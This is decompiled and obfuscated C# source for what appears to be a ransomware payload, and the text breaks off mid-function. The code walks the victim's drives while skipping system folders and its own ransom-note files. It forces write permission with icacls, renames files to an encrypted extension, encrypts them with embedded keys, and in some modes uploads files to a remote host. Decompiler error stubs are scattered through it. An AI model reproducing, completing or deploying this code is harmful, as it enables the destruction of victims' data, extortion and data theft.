using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using NS001;
using NS002;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace coxZRmDhvSAWo;

internal sealed class GhAMvbuoccW
{
	public sealed class c000003
	{
		private static StringCollection YkLwhicznNAwtvOO;

		private static List<string> hFeyBiheGelkT;

		[NonSerialized]
		internal static GetString f000038;

		public static List<string> SearchFiles(string p0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(p0);
		}

		private static List<string> WalkDirectoryTree(string p0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(p0, "*.*");
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if ((!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer") && !text.ToLower().Contains("programdata") && !text.ToLower().Contains("appdata") && !text.ToLower().Contains("autoexec.bat") && !text.ToLower().Contains("desktop.ini") && !text.ToLower().Contains("autorun.inf") && !text.ToLower().Contains("ntuser.dat") && !text.ToLower().Contains("iconcache.db") && !text.ToLower().Contains("bootsect.bak") && !text.ToLower().Contains("boot.ini") && !text.ToLower().Contains("ntuser.dat.log") && !text.ToLower().Contains("thumbs.db") && !text.ToLower().Contains("bootmgr") && !text.ToLower().Contains("pagefile.sys") && !text.ToLower().Contains("config.sys") && !text.ToLower().Contains("ntuser.ini") && !text.Contains("Builder_Log") && !text.Contains("RSAKeys") && !text.Contains("RESTORE_FILES_INFO") && !text.EndsWith(".NARUMI") && !text.EndsWith("exe") && !text.EndsWith("dll") && !text.EndsWith("EXE") && !text.EndsWith("DLL") && !text.ToLower().Contains("Recycle.Bin") && !text.ToLower().Contains(RoiBxbbYOpTnzdF)) || text.Contains("Microsoft SQL Server"))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(nsiwXjKpMUO) * 1024.0 * 1024.0 && HirTGWkSHczrmbY == "YES")
							{
								hFeyBiheGelkT.Add(text);
							}
							else if (File.Exists(text) && HirTGWkSHczrmbY == "NO")
							{
								hFeyBiheGelkT.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(p0);
				array3 = array2;
				foreach (string p in array3)
				{
					WalkDirectoryTree(p);
				}
			}
			return hFeyBiheGelkT;
		}

		static c000003()
		{
			Strings.CreateGetStringDelegate(typeof(c000003));
			YkLwhicznNAwtvOO = new StringCollection();
			hFeyBiheGelkT = new List<string>();
		}
	}

	private sealed class c000004
	{
		public string avfxhzATpymbWL;

		public bool m000012(Process p0)
		{
			return p0.ProcessName == avfxhzATpymbWL;
		}
	}

	private sealed class NxIyepnTFBO
	{
		public string nvRebewysN;

		public bool m000013(DriveInfo p0)
		{
			return p0.RootDirectory.Name == nvRebewysN;
		}
	}

	private sealed class MCSuzJljyGwrZ
	{
		private sealed class uILPrdIBlgQjre
		{
			public MCSuzJljyGwrZ f00003c;

			public string f00003d;

			public void m000015()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					sMlBAtMqAgeMq(WindowsIdentity.GetCurrent().Name, f00003d);
				}
			}

			public void m000016()
			{
				uBTjgvutOlsTJ(f00003d, f00003c.f000039, f00003c.f00003a, f00003c.CToRljeBfHM, f00003c.hSfGYaylYziGu);
			}
		}

		public string[] f000039;

		public string[] CToRljeBfHM;

		public string hSfGYaylYziGu;

		public string f00003a;

		[NonSerialized]
		internal static GetString f00003b;

		public void m000014(string p0)
		{
			uILPrdIBlgQjre uILPrdIBlgQjre = new uILPrdIBlgQjre();
			uILPrdIBlgQjre.f00003c = this;
			uILPrdIBlgQjre.f00003d = p0;
			if (f000028 && !"Windows 8".Contains("XP") && !"Windows 8".Contains("Windows 7"))
			{
				Thread thread = new Thread(uILPrdIBlgQjre.m000015);
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (rmNaxrdaErS == "YES")
			{
				Thread thread2 = new Thread(uILPrdIBlgQjre.m000016);
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				uBTjgvutOlsTJ(uILPrdIBlgQjre.f00003d, f000039, f00003a, CToRljeBfHM, hSfGYaylYziGu);
			}
		}

		static MCSuzJljyGwrZ()
		{
			Strings.CreateGetStringDelegate(typeof(MCSuzJljyGwrZ));
		}
	}

	private sealed class mDsrdwsfBAgqx
	{
		private sealed class bKLeOnnwOsJw
		{
			public mDsrdwsfBAgqx irnVJvnuIedJmu;

			public string ldrdWbhdALtRA;

			[NonSerialized]
			internal static GetString f000040;

			public void m000019()
			{
				try
				{
					if (f000029)
					{
						Console.WriteLine("File in process: " + ldrdWbhdALtRA + " - File Size: " + new FileInfo(ldrdWbhdALtRA).Length + " bytes");
						Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", f000006.Count, f00002b, f00002a);
						Console.WriteLine("Time elapsed:  {0}", lBGXxmsJjqv.Elapsed);
						Console.WriteLine("----------------------------------------------------------------------------");
					}
				}
				catch
				{
				}
			}

			static bKLeOnnwOsJw()
			{
				Strings.CreateGetStringDelegate(typeof(bKLeOnnwOsJw));
			}
		}

		private sealed class c00000a
		{
			public bKLeOnnwOsJw SnSgbcozGOnPa;

			public mDsrdwsfBAgqx irnVJvnuIedJmu;

			public string f000041;

			[NonSerialized]
			internal static GetString f000042;

			public void m00001a()
			{
				foreach (string item in f000013)
				{
					if (f000041.ToLower().EndsWith(item + irnVJvnuIedJmu.f00003e) && f000014 == "YES")
					{
						if (Convert.ToInt32(f000015) * 1024 * 1024 > new FileInfo(f000041).Length)
						{
							try
							{
								c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", f000041);
							}
							catch
							{
							}
						}
					}
					else if (f000041.ToLower().EndsWith(item) && f000014 == "NO")
					{
						try
						{
							c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", f000041);
						}
						catch
						{
						}
					}
				}
			}

			static c00000a()
			{
				Strings.CreateGetStringDelegate(typeof(c00000a));
			}
		}

		private sealed class c00000b
		{
			public mDsrdwsfBAgqx irnVJvnuIedJmu;

			public string ldrdWbhdALtRA;

			[NonSerialized]
			internal static GetString f000043;

			public void m00001b()
			{
				try
				{
					if (f000029)
					{
						Console.WriteLine("File in process: " + ldrdWbhdALtRA + " - File Size: " + new FileInfo(ldrdWbhdALtRA).Length + " bytes");
						Console.WriteLine("Total Files / Done / Errors: {0}, {1}, {2}", f000006.Count, f00002b, f00002a);
						Console.WriteLine("Time elapsed:  {0}", lBGXxmsJjqv.Elapsed);
						Console.WriteLine("----------------------------------------------------------------------------");
					}
				}
				catch
				{
				}
			}

			public void m00001c()
			{
				foreach (string item in f000013)
				{
					if (ldrdWbhdALtRA.ToLower().EndsWith(item + irnVJvnuIedJmu.f00003e) && f000014 == "YES")
					{
						if (Convert.ToInt32(f000015) * 1024 * 1024 > new FileInfo(ldrdWbhdALtRA).Length)
						{
							try
							{
								c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", ldrdWbhdALtRA);
							}
							catch
							{
							}
						}
					}
					else if (ldrdWbhdALtRA.ToLower().EndsWith(item) && f000014 == "NO")
					{
						try
						{
							c000013.ybntlhJHhisLb("URL", "USERNAME", "ACCESO", ldrdWbhdALtRA);
						}
						catch
						{
						}
					}
				}
			}

			static c00000b()
			{
				Strings.CreateGetStringDelegate(typeof(c00000b));
			}
		}

		public List<string> MWjzSWdUTiapH;

		public List<string> vJUzSMoRbycwzG;

		public string f00003e;

		public string[] nBTsxqqCcIrA;

		public string f000002;

		[NonSerialized]
		internal static GetString f00003f;

		public void m000017(string p0)
		{
			//Discarded unreachable code: IL_0b3c, IL_0c5b
			using List<string>.Enumerator enumerator = vJUzSMoRbycwzG.GetEnumerator();
			while (enumerator.MoveNext())
			{
				bKLeOnnwOsJw bKLeOnnwOsJw = new bKLeOnnwOsJw();
				bKLeOnnwOsJw.irnVJvnuIedJmu = this;
				bKLeOnnwOsJw.ldrdWbhdALtRA = enumerator.Current;
				if (((bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("C:\\Program Files\\") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("C:\\Program Files (x86)\\") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains(":\\Windows\\") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("perflogs") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("internet explorer") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains(":\\ProgramData\\") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("\\AppData\\") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("msocache") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("system volume information") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("boot") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("tor browser") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("mozilla") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("google chrome") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("application data")) && !bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("Microsoft SQL Server")) || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("autoexec.bat") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("desktop.ini") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("autorun.inf") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("ntuser.dat") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("NTUSER.DAT") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("iconcache.db") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("bootsect.bak") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("boot.ini") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("ntuser.dat.log") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("thumbs.db") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("bootmgr") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("pagefile.sys") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("config.sys") || bKLeOnnwOsJw.ldrdWbhdALtRA.ToLower().Contains("ntuser.ini") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("Builder_Log") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("RSAKeys") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("Config.enc") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("RESTORE_FILES_INFO") || bKLeOnnwOsJw.ldrdWbhdALtRA.EndsWith(f00003e) || bKLeOnnwOsJw.ldrdWbhdALtRA.EndsWith("exe") || bKLeOnnwOsJw.ldrdWbhdALtRA.EndsWith("dll") || bKLeOnnwOsJw.ldrdWbhdALtRA.EndsWith("EXE") || bKLeOnnwOsJw.ldrdWbhdALtRA.EndsWith("DLL") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains("Recycle.Bin") || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains(RoiBxbbYOpTnzdF) || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains(f000025) || bKLeOnnwOsJw.ldrdWbhdALtRA.Contains(muQSQoYNOwJp))
				{
					continue;
				}
				if (nBTsxqqCcIrA.Length == 0)
				{
					/*Error: Could not find block for branch target IL_041b*/;
				}
				string[] array = nBTsxqqCcIrA;
				int num = 0;
				while (true)
				{
					if (num < array.Length)
					{
						string value = array[num];
						if (!bKLeOnnwOsJw.ldrdWbhdALtRA.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d97;
					}
					try
					{
						if (bKLeOnnwOsJw.ldrdWbhdALtRA.EndsWith(f00003e))
						{
							goto IL_0d97;
						}
					}
					catch (Exception)
					{
						goto IL_0d97;
					}
					if (!bKLeOnnwOsJw.ldrdWbhdALtRA.EndsWith(p0) || f000006.Contains(bKLeOnnwOsJw.ldrdWbhdALtRA))
					{
						break;
					}
					if (BBqvZtJMKtZyzF == "YES")
					{
						try
						{
							if (uruahRFIszrntX.bURwEzWcMZKaoi(bKLeOnnwOsJw.ldrdWbhdALtRA))
							{
								uruahRFIszrntX.BBxxokkeNIlNHfR(bKLeOnnwOsJw.ldrdWbhdALtRA);
							}
						}
						catch
						{
						}
					}
					f000006.Add(bKLeOnnwOsJw.ldrdWbhdALtRA);
					Thread thread = new Thread(bKLeOnnwOsJw.m000019);
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(bKLeOnnwOsJw.ldrdWbhdALtRA)))
					{
						HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(bKLeOnnwOsJw.ldrdWbhdALtRA));
					}
					m000008(bKLeOnnwOsJw.ldrdWbhdALtRA);
					try
					{
						new SnjLOUpfRioti().fwTUnyzIwakYqxR(bKLeOnnwOsJw.ldrdWbhdALtRA);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(bKLeOnnwOsJw.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (f000029)
								{
									Console.WriteLine("Setting write access permission: " + bKLeOnnwOsJw.ldrdWbhdALtRA + " - File Size: " + new FileInfo(bKLeOnnwOsJw.ldrdWbhdALtRA).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							m000002("icacls.exe", "\"" + bKLeOnnwOsJw.ldrdWbhdALtRA + "\"" + " /grant " + "\"" + Environment.UserName + "\"" + ":F /T /C /Q");
						}
					}
					catch (Exception ex2)
					{
						if (CCDyMIHlAe)
						{
							try
							{
								File.AppendAllText(f000025, "File: " + bKLeOnnwOsJw.ldrdWbhdALtRA + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						break;
					}
					try
					{
						try
						{
							if (new FileInfo(bKLeOnnwOsJw.ldrdWbhdALtRA).Length == 0L)
							{
								break;
							}
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(f000025, "File: " + bKLeOnnwOsJw.ldrdWbhdALtRA + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							f00002a++;
							goto end_IL_067f;
						}
						byte[] bytes;
						if (f00000f == "YES" && new FileInfo(bKLeOnnwOsJw.ldrdWbhdALtRA).Length > Convert.ToInt32(f000010) * 1024 * 1024 && !MWjzSWdUTiapH.Contains(p0))
						{
							c00000a c00000a = new c00000a();
							c00000a.SnSgbcozGOnPa = bKLeOnnwOsJw;
							c00000a.irnVJvnuIedJmu = this;
							try
							{
								if (f00003e != ".*")
								{
									if (YazilaoopZ)
									{
										f00003e = f00002c + f00003e;
									}
									File.Move(bKLeOnnwOsJw.ldrdWbhdALtRA, bKLeOnnwOsJw.ldrdWbhdALtRA + f00003e);
								}
							}
							catch (Exception ex2)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(f000025, "File: " + bKLeOnnwOsJw.ldrdWbhdALtRA + " - Error while renaming to crypted extension: " + ex2.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								f00002a++;
								goto end_IL_067f;
							}
							c00000a.f000041 = "";
							if (f00003e != ".*")
							{
								c00000a.f000041 = bKLeOnnwOsJw.ldrdWbhdALtRA + f00003e;
							}
							else
							{
								c00000a.f000041 = bKLeOnnwOsJw.ldrdWbhdALtRA;
							}
							if (f000012 == "YES")
							{
								Thread thread2 = new Thread(c00000a.m00001a);
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (nqNdPWHffReq == "NO")
							{
								byte[] array2 = null;
								byte[] p = c000018.KQanXSigbuDh(c00000a.f000041, Convert.ToInt32(f000010) * 1024 * 1024);
								if (c000018.EHTmbBVFpgxa(p1: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? c000018.SvtZMRYDytMixf(p, Convert.FromBase64String(f000002), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : c000018.SvtZMRYDytMixf(p, Convert.FromBase64String(f000002), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? sAdFSOOagDt.m00002a(p, Convert.FromBase64String(f000002), Convert.FromBase64String(f000003)) : sAdFSOOagDt.m00002a(p, Convert.FromBase64String(f000002), Convert.FromBase64String(f000003))), p0: c00000a.f000041, p2: bytes))
								{
									goto IL_0d97;
								}
								try
								{
									File.Move(bKLeOnnwOsJw.ldrdWbhdALtRA + f00003e, bKLeOnnwOsJw.ldrdWbhdALtRA);
								}
								catch (Exception)
								{
								}
							}
							else if (!PAOJgADrbjEa)
							{
								if (GeksFIyCuYbq.uVsAlcvYzOr(c00000a.f000041, f000010, f000002, null, Convert.FromBase64String(f000003)))
								{
									goto IL_0d97;
								}
								try
								{
									File.Move(bKLeOnnwOsJw.ldrdWbhdALtRA + f00003e, bKLeOnnwOsJw.ldrdWbhdALtRA);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (GeksFIyCuYbq.uVsAlcvYzOr(c00000a.f000041, f000010, f000002, bytes, Convert.FromBase64String(f000003)))
								{
									goto IL_0d97;
								}
								try
								{
									File.Move(bKLeOnnwOsJw.ldrdWbhdALtRA + f00003e, bKLeOnnwOsJw.ldrdWbhdALtRA);
								}
								catch (Exception)
								{
								}
							}
							break;
						}
						if (YazilaoopZ)
						{
							f00003e = f00002c + f00003e;
						}
						bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
						if (!(f00003e != ".*"))
						{
							if (UOlZmEwYRBbnfmvt)
							{
								/*Error: Could not find block for branch target IL_0b3d*/;
							}
							if (PAOJgADrbjEa)
							{
								fsRkhosBCvdFpjZ(bKLeOnnwOsJw.ldrdWbhdALtRA, bKLeOnnwOsJw.ldrdWbhdALtRA + ".part", Convert.FromBase64String(f000002));
							}
							else
							{
								fsRkhosBCvdFpjZ(bKLeOnnwOsJw.ldrdWbhdALtRA, bKLeOnnwOsJw.ldrdWbhdALtRA + ".part", bGfpmpYMCsNkyjcK);
							}
						}
						else
						{
							if (UOlZmEwYRBbnfmvt)
							{
								/*Error: Could not find block for branch target IL_0c5c*/;
							}
							if (PAOJgADrbjEa)
							{
								fsRkhosBCvdFpjZ(bKLeOnnwOsJw.ldrdWbhdALtRA, bKLeOnnwOsJw.ldrdWbhdALtRA + f00003e, Convert.FromBase64String(f000002));
							}
							else
							{
								fsRkhosBCvdFpjZ(bKLeOnnwOsJw.ldrdWbhdALtRA, bKLeOnnwOsJw.ldrdWbhdALtRA + f00003e, bGfpmpYMCsNkyjcK);
							}
						}
						if (PAOJgADrbjEa)
						{
							if (f00003e != ".*")
							{
								m000006(bKLeOnnwOsJw.ldrdWbhdALtRA + f00003e, bytes);
							}
							else
							{
								m000006(bKLeOnnwOsJw.ldrdWbhdALtRA, bytes);
							}
						}
						goto IL_0d97;
						end_IL_067f:;
					}
					catch (Exception)
					{
						goto IL_0d97;
					}
					break;
					IL_0d97:
					vJUzSMoRbycwzG.Remove(bKLeOnnwOsJw.ldrdWbhdALtRA);
					break;
				}
			}
		}

		public void m000018(string p0)
		{
			//Discarded unreachable code: IL_0abf, IL_0bde
			c00000b c00000b = new c00000b();
			c00000b.irnVJvnuIedJmu = this;
			c00000b.ldrdWbhdALtRA = p0;
			if (((!c00000b.ldrdWbhdALtRA.Contains("C:\\Program Files\\") && !c00000b.ldrdWbhdALtRA.Contains("C:\\Program Files (x86)\\") && !c00000b.ldrdWbhdALtRA.Contains(":\\Windows\\") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("perflogs") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("internet explorer") && !c00000b.ldrdWbhdALtRA.Contains(":\\ProgramData\\") && !c00000b.ldrdWbhdALtRA.Contains("\\AppData\\") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("msocache") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("system volume information") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("boot") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("tor browser") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("mozilla") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("google chrome") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("application data")) || c00000b.ldrdWbhdALtRA.Contains("Microsoft SQL Server")) && !c00000b.ldrdWbhdALtRA.Contains("autoexec.bat") && !c00000b.ldrdWbhdALtRA.Contains("desktop.ini") && !c00000b.ldrdWbhdALtRA.Contains("autorun.inf") && !c00000b.ldrdWbhdALtRA.Contains("ntuser.dat") && !c00000b.ldrdWbhdALtRA.Contains("NTUSER.DAT") && !c00000b.ldrdWbhdALtRA.Contains("iconcache.db") && !c00000b.ldrdWbhdALtRA.Contains("bootsect.bak") && !c00000b.ldrdWbhdALtRA.Contains("boot.ini") && !c00000b.ldrdWbhdALtRA.Contains("ntuser.dat.log") && !c00000b.ldrdWbhdALtRA.Contains("thumbs.db") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("bootmgr") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("pagefile.sys") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("config.sys") && !c00000b.ldrdWbhdALtRA.ToLower().Contains("ntuser.ini") && !c00000b.ldrdWbhdALtRA.Contains("Builder_Log") && !c00000b.ldrdWbhdALtRA.Contains("RSAKeys") && !c00000b.ldrdWbhdALtRA.Contains("Config.enc") && !c00000b.ldrdWbhdALtRA.Contains("RESTORE_FILES_INFO") && !c00000b.ldrdWbhdALtRA.EndsWith(f00003e) && !c00000b.ldrdWbhdALtRA.EndsWith("exe") && !c00000b.ldrdWbhdALtRA.EndsWith("dll") && !c00000b.ldrdWbhdALtRA.EndsWith("EXE") && !c00000b.ldrdWbhdALtRA.EndsWith("DLL") && !c00000b.ldrdWbhdALtRA.Contains("Recycle.Bin") && !c00000b.ldrdWbhdALtRA.Contains(RoiBxbbYOpTnzdF) && !c00000b.ldrdWbhdALtRA.Contains(f000025) && !c00000b.ldrdWbhdALtRA.Contains(muQSQoYNOwJp))
			{
				if (nBTsxqqCcIrA.Length == 0)
				{
					/*Error: Could not find block for branch target IL_03fe*/;
				}
				string[] array = nBTsxqqCcIrA;
				int num = 0;
				while (true)
				{
					if (num < array.Length)
					{
						string value = array[num];
						if (!c00000b.ldrdWbhdALtRA.EndsWith(value))
						{
							num++;
							continue;
						}
						break;
					}
					try
					{
						if (c00000b.ldrdWbhdALtRA.EndsWith(f00003e))
						{
							break;
						}
					}
					catch (Exception)
					{
						break;
					}
					if (f000006.Contains(c00000b.ldrdWbhdALtRA))
					{
						break;
					}
					if (BBqvZtJMKtZyzF == "YES")
					{
						try
						{
							if (uruahRFIszrntX.bURwEzWcMZKaoi(c00000b.ldrdWbhdALtRA))
							{
								uruahRFIszrntX.BBxxokkeNIlNHfR(c00000b.ldrdWbhdALtRA);
							}
						}
						catch
						{
						}
					}
					f000006.Add(c00000b.ldrdWbhdALtRA);
					Thread thread = new Thread(c00000b.m00001b);
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(c00000b.ldrdWbhdALtRA)))
					{
						HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(c00000b.ldrdWbhdALtRA));
					}
					m000008(c00000b.ldrdWbhdALtRA);
					try
					{
						new SnjLOUpfRioti().fwTUnyzIwakYqxR(c00000b.ldrdWbhdALtRA);
					}
					catch
					{
					}
					try
					{
						using FileStream fileStream = new FileStream(c00000b.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write);
						if (!fileStream.CanWrite)
						{
							try
							{
								if (f000029)
								{
									Console.WriteLine("Setting write access permission: " + c00000b.ldrdWbhdALtRA + " - File Size: " + new FileInfo(c00000b.ldrdWbhdALtRA).Length + " bytes");
									Console.WriteLine("----------------------------------------------------------------------------");
								}
							}
							catch
							{
							}
							m000002("icacls.exe", "\"" + c00000b.ldrdWbhdALtRA + "\"" + " /grant " + "\"" + Environment.UserName + "\"" + ":F /T /C /Q");
						}
					}
					catch (Exception ex2)
					{
						if (CCDyMIHlAe)
						{
							try
							{
								File.AppendAllText(f000025, "File: " + c00000b.ldrdWbhdALtRA + " - Error while checking for user write access permission: " + ex2.Message + "\r\n");
								return;
							}
							catch (Exception)
							{
								return;
							}
						}
						return;
					}
					try
					{
						try
						{
							if (new FileInfo(c00000b.ldrdWbhdALtRA).Length == 0L)
							{
								break;
							}
						}
						catch (Exception ex2)
						{
							if (CCDyMIHlAe)
							{
								try
								{
									File.AppendAllText(f000025, "File: " + c00000b.ldrdWbhdALtRA + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
								}
								catch (Exception)
								{
								}
							}
							f00002a++;
							goto end_IL_064c;
						}
						byte[] bytes;
						if (f00000f == "YES" && new FileInfo(c00000b.ldrdWbhdALtRA).Length > Convert.ToInt32(f000010) * 1024 * 1024)
						{
							try
							{
								if (f00003e != ".*")
								{
									if (YazilaoopZ)
									{
										f00003e = f00002c + f00003e;
									}
									File.Move(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + f00003e);
								}
							}
							catch (Exception ex2)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(f000025, "File: " + c00000b.ldrdWbhdALtRA + " - Error while renaming to crypted extension: " + ex2.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								f00002a++;
								return;
							}
							if (f00003e != ".*")
							{
								c00000b.ldrdWbhdALtRA += f00003e;
							}
							if (f000012 == "YES")
							{
								Thread thread2 = new Thread(c00000b.m00001c);
								thread2.IsBackground = false;
								thread2.Priority = ThreadPriority.Normal;
								thread2.Start();
							}
							bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
							if (nqNdPWHffReq == "NO")
							{
								byte[] array2 = null;
								byte[] p = c000018.KQanXSigbuDh(c00000b.ldrdWbhdALtRA, Convert.ToInt32(f000010) * 1024 * 1024);
								if (!c000018.EHTmbBVFpgxa(p1: (!uBIPmjbCjNt) ? (PAOJgADrbjEa ? c000018.SvtZMRYDytMixf(p, Convert.FromBase64String(f000002), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : c000018.SvtZMRYDytMixf(p, Convert.FromBase64String(f000002), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (PAOJgADrbjEa ? sAdFSOOagDt.m00002a(p, Convert.FromBase64String(f000002), Convert.FromBase64String(f000003)) : sAdFSOOagDt.m00002a(p, Convert.FromBase64String(f000002), Convert.FromBase64String(f000003))), p0: c00000b.ldrdWbhdALtRA, p2: bytes))
								{
									try
									{
										File.Move(c00000b.ldrdWbhdALtRA + f00003e, c00000b.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!PAOJgADrbjEa)
							{
								if (!GeksFIyCuYbq.uVsAlcvYzOr(c00000b.ldrdWbhdALtRA, f000010, f000002, null, Convert.FromBase64String(f000003)))
								{
									try
									{
										File.Move(c00000b.ldrdWbhdALtRA + f00003e, c00000b.ldrdWbhdALtRA);
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
							}
							else if (!GeksFIyCuYbq.uVsAlcvYzOr(c00000b.ldrdWbhdALtRA, f000010, f000002, bytes, Convert.FromBase64String(f000003)))
							{
								try
								{
									File.Move(c00000b.ldrdWbhdALtRA + f00003e, c00000b.ldrdWbhdALtRA);
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							break;
						}
						if (YazilaoopZ)
						{
							f00003e = f00002c + f00003e;
						}
						bytes = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
						if (!(f00003e != ".*"))
						{
							if (UOlZmEwYRBbnfmvt)
							{
								/*Error: Could not find block for branch target IL_0ac0*/;
							}
							if (PAOJgADrbjEa)
							{
								fsRkhosBCvdFpjZ(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + ".part", Convert.FromBase64String(f000002));
							}
							else
							{
								fsRkhosBCvdFpjZ(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + ".part", bGfpmpYMCsNkyjcK);
							}
						}
						else
						{
							if (UOlZmEwYRBbnfmvt)
							{
								/*Error: Could not find block for branch target IL_0bdf*/;
							}
							if (PAOJgADrbjEa)
							{
								fsRkhosBCvdFpjZ(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + f00003e, Convert.FromBase64String(f000002));
							}
							else
							{
								fsRkhosBCvdFpjZ(c00000b.ldrdWbhdALtRA, c00000b.ldrdWbhdALtRA + f00003e, bGfpmpYMCsNkyjcK);
							}
						}
						if (PAOJgADrbjEa)
						{
							if (f00003e != ".*")
							{
								m000006(c00000b.ldrdWbhdALtRA + f00003e, bytes);
							}
							else
							{
								m000006(c00000b.ldrdWbhdALtRA, bytes);
							}
						}
						end_IL_064c:;
					}
